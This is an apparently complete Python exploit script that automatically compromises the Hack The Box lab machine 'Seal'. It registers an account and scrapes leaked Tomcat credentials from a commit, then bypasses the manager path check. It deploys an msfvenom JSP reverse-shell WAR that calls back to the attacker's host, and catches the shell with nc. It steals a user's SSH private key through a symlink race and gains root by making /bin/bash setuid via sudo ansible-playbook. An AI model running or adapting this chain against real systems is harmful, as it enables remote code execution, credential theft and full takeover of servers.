#!/usr/bin/python3
import time
import os.path
import os
import urllib3
import urllib
import argparse

from requests.api import head
from urllib3.exceptions import HeaderParsingError
from pwn import *
import requests
import random
import datetime


begin_time = datetime.datetime.now()

keypath = '/tmp/id_rsa'
split_variable = ''.join([chr(random.randrange(65, 90))
                          for i in range(20)])
rev_split_variable = split_variable[::-1]
context.log_level = 'error'


if not(os.path.isfile(keypath)):

    #proxies = {
    #    'http': 'http://localhost:8800',
    #    'https': 'http://localhost:8800'
    #}

    s = requests.session()

    number = random.randrange(0, (2**16))
    first_name = 'root'
    second_name = 'hacks'
    random_name = f"{first_name}{second_name}{str(number)}"

    no_priv_url = 'http://seal.htb:8080/'

    creds = {'userName': random_name,
             'password': number}

    data = {'fullName': f"{first_name} {second_name}",
            'mailAddress': f'{first_name}{second_name}{number}@{first_name}.{second_name}',
            'extraMailAddresses%5B0%5D': '',
            'url': '',
            'description': '',
            'fileId': ''
            }

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
        'Accept': 'application/json, text/javascript, */*; q:0.01',
        'Accept-Language': 'en-US,en;q:0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset:UTF-8',
        'X-Requested-With': 'XMLHttpRequest'
    }

    full_data = creds | data
    # print(full_data)
    # exit()

    s.get(no_priv_url)
    # exit()

    r = s.post(f'{no_priv_url}register',
               data=urllib.parse.urlencode(full_data),
               headers=headers,
               #    proxies=proxies,
               allow_redirects=False)

    # print(r.text)
    if r.status_code != 302:
        print('Registering: ' + random_name + " didn't work. ")
        exit()
    # print(r.text)
    r = s.post(f'{no_priv_url}signin',
               headers=headers,
               #    proxies=proxies,
               data=urllib.parse.urlencode(creds | {'hash': ''}),
               allow_redirects=False
               )
    if r.status_code != 302:
        print('Signing in failed with  ' + random_name + ":" + str(number))
        exit()

    r = s.get('http://seal.htb:8080/root/seal_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7',
              #   proxies=proxies,
              headers=headers
              )
    username_tomcat = r.text.split('username=&quot;')[
        1:][-1].split('&quot;')[0]
    password_tomcat = r.text.split('password=&quot;')[
        1:][-1].split('&quot;')[0]
    # print(f"{username_tomcat}:{password_tomcat}")

    url_tomcat_auth = "https://seal.htb/manager/status/..;/html"

    # username_tomcat = 'tomcat'
    # password_tomcat = '42MrHBf*z8{Z%'
    auth = (username_tomcat, password_tomcat)

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    # print(url_tomcat)
    # exit()
    r = s.get(url_tomcat_auth,
              auth=auth,
              verify=False,
              #   proxies=proxies
              )
    csfr = r.text.split('CSRF_NONCE=')[-1].split('"')[0]
    upload_string = r.text.split(csfr)[-2][::-1].split('?')[0][::-1]

    url_tomcat = 'https://seal.htb/manager/.;/html/upload'
    post_url = f"{url_tomcat}?{upload_string}{csfr}"
    shellname = 'revshell.war'

    if not(os.path.isfile(shellname)):
        with os.popen("ip a s tun0 | grep -Eo '\''(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0                                -9]|[01]?[0-9][0-9]?)'\'' | head -n 1") as p:
            lhost = p.read().strip().replace('\n', '')
        with os.popen(f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT=9000 -f war -o {shellname} 2> /dev/null') as p:
            pass

    files = {'deployWar':
             (random_name + '.war',  # filename on server
              open(shellname, 'rb'),
              'application/octet-stream')
             }
    # files = {'deployWar': ('revshell4.war', open('revshell3.war', 'rb'),
    #                        'application/octet-stream')}  # , {'Expires': '0'}

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q:0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Te': 'trailers',
        'Upgrade-Insecure-Requests': '1',
        'Connection': 'close'
    }

    r = s.post(post_url,
               verify=False,
               auth=auth,
               headers=headers,
               #    proxies=proxies,
               files=files,
               )
    if r.status_code != 200:
        print('Failed to upload the war file.')
        exit()

    while_true_loop_client = f"""
cat > /tmp/get_ssh_id_rsa.sh << EOF
#!/bin/bash
while [ ! -f /tmp/dashboard/uploads/id_rsa ];
do
  sleep 1
  ln -s /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
  tar -zxvzf \$(find /opt/backups/archives -type f -printf '%T@ %p\n' | sort -n | tail -1 | cut -f2- -d" ") -C /tmp/
  echo 'stuck in the matrix'
done
echo "start{split_variable}"
cat /tmp/dashboard/uploads/id_rsa
echo "{rev_split_variable}done"
EOF

chmod +x /tmp/get_ssh_id_rsa.sh
/tmp/get_ssh_id_rsa.sh
# rm -r /tmp/dashboard
"""
    with process(["nc", "-lvnp", '9000']) as listener:
        time.sleep(1)
        s.get('https://seal.htb/' + random_name + r'/',
              verify=False,
              #   proxies=proxies,
              headers=headers,)
        listener.recvuntil('\n')
        listener.recvuntil('\n')
        # listener.interactive()
        listener.send(while_true_loop_client)
        id_rsa_raw = listener.recvuntil('done\n')
        id_rsa = id_rsa_raw.decode('latin-1').split(
            rev_split_variable)[-2].split(split_variable)[1]
        # print(id_rsa)
        with open(keypath, 'w') as f:
            f.write("\n".join(id_rsa.split('\n')[1:]))
        with os.popen("chmod 600 " + keypath) as p:
            pass

root_expl = f'''
cat > ~/get_root.yml << EOF
- hosts: localhost
  tasks:
  - name: test
    command: "chmod +s /bin/bash"
EOF

cat > ~/get_root.sh << OEF
#!/bin/bash
sudo /usr/bin/ansible-playbook ~/get_root.yml
OEF

cat > ~/clean_machine.sh << OEF
#!/bin/bash -p
chmod -s /bin/bash
rm -r /tmp/dashboard
OEF

cat > ~/cat_root_flag.sh << EOF
#!/bin/bash -p
echo -n "{split_variable} "
cat /root/root.txt
echo " {rev_split_variable}"
EOF

chmod +x ~/get_root.sh  ~/cat_root_flag.sh ~/unset_root.sh
~/get_root.sh && ~/cat_root_flag.sh
'''

with ssh(host='seal.htb', user="luis", keyfile=keypath) as conn:
    user_flag = conn('cat ~/user.txt').decode('latin-1')
    root_flag = repr(conn(root_expl)).\
        split(rev_split_variable)[-2].\
        split(split_variable)[1].\
        strip().\
        replace('\\n', '')

print(f'user.txt: {user_flag}')
print(f"root.txt: {root_flag}")
